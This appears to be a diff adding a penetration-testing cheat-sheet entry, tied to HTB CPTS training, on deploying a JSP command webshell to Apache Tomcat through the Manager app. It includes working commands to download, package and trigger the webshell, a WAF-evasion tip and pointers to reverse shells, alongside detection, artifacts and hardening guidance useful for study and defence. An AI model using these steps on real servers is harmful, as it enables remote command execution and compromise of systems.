@@ -1,0 +1,98 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "curl"
+  ],
+  "tags": [
+    "tomcat",
+    "webshell",
+    "war",
+    "rce"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Tomcat",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Download a JSP command webshell",
+      "command": "wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp"
+    },
+    {
+      "label": "Package it into a deployable WAR",
+      "command": "zip -r backup.war cmd.jsp"
+    },
+    {
+      "label": "Trigger the deployed webshell",
+      "command": "curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id"
+    }
+  ],
+  "notes": "Deploying a WAR through /manager/html requires manager-script or manager-gui role. The app path equals the WAR name, so backup.war is reached at /backup/.",
+  "references": [
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "tomcat-mgr-bruteforce",
+      "note": "Provides the manager creds to deploy the WAR.",
+      "rel": "prereq"
+    },
+    {
+      "id": "tomcat-msfvenom-war",
+      "note": "Reverse-shell WAR alternative.",
+      "rel": "alternative"
+    },
+    {
+      "id": "reverse-shell-oneliners",
+      "note": "Upgrade the JSP webshell to a reverse shell.",
+      "rel": "escalation"
+    }
+  ],
+  "id": "tomcat-war-webshell",
+  "name": "Tomcat - JSP WAR Webshell Deploy",
+  "command": "zip -r backup.war cmd.jsp   # then deploy via /manager and run",
+  "description": "Packages a JSP command-shell into a WAR, deploys it through the authenticated Manager app, and executes commands via the deployed endpoint.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1505.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Tomcat's Manager application accepts WAR uploads and deploys them automatically. A WAR containing a JSP webshell is instantly accessible at /<war-name>/<file.jsp> executing commands via Runtime.exec() as the Tomcat process user.",
+    "prerequisites": "Valid manager-script or manager-gui credentials. /manager accessible from the attacker.",
+    "impact": "Persistent JSP webshell running as the Tomcat OS user. Enables file read/write, lateral movement, and reverse shell upgrade.",
+    "detection": "WAR deployment via POST to /manager/deploy. New application context in Tomcat. GET requests to new JSP with cmd parameter. Unusual child processes spawned by Tomcat.",
+    "artifacts": "Tomcat manager access log (POST /manager/deploy) | catalina.out: new context deployed | Web server log (GET /backup/cmd.jsp?cmd=id) | Process audit log (bash spawned from java)",
+    "prevention": "Restrict /manager to localhost. Use manager-script role only. Monitor WAR deployments. Run Tomcat as a low-privilege user. Use AppArmor/SELinux to restrict Tomcat process capabilities.",
+    "misconfiguration": "Tomcat Manager accessible from internet. manager-gui role assigned. Tomcat runs as root or has excessive filesystem privileges.",
+    "vulnerable_config": "<!-- Tomcat -- manager reachable from any IP, weak auth, runs as root -->\n<!-- conf/context.xml -- no IP restriction -->\n<!-- Valve for RemoteAddrValve commented out -->\n\n<!-- conf/tomcat-users.xml -->\n<role rolename=\"manager-gui\"/>\n<role rolename=\"manager-script\"/>\n<user username=\"admin\" password=\"admin\" roles=\"manager-gui,manager-script\"/>\n\n<!-- systemd/init -- Tomcat running as root -->\n# /etc/systemd/system/tomcat.service\n[Service]\nUser=root\nExecStart=/opt/tomcat/bin/startup.sh",
+    "secure_config": "<!-- Tomcat -- restrict manager, strong auth, run as dedicated user -->\n<!-- conf/context.xml -->\n<Context>\n  <Valve className=\"org.apache.catalina.valves.RemoteAddrValve\"\n         allow=\"127\\.0\\.0\\.1|::1\"/>\n</Context>\n\n<!-- conf/tomcat-users.xml -->\n<role rolename=\"manager-script\"/>\n<user username=\"deploy\" password=\"Rnd0mStr0ng!Pass#9\" roles=\"manager-script\"/>\n<!-- Remove manager-gui role entirely in production -->\n\n<!-- /etc/systemd/system/tomcat.service -->\n[Service]\nUser=tomcat\nGroup=tomcat\nExecStart=/opt/tomcat/bin/startup.sh",
+    "evasion": "Use manager-script REST API (/manager/text/deploy) instead of GUI upload to avoid form-based WAF triggers.",
+    "sources": [
+      "HTB M24",
+      "MITRE T1505.003",
+      "MITRE T1190",
+      "OWASP A04:2021"
+    ]
+  }
+}
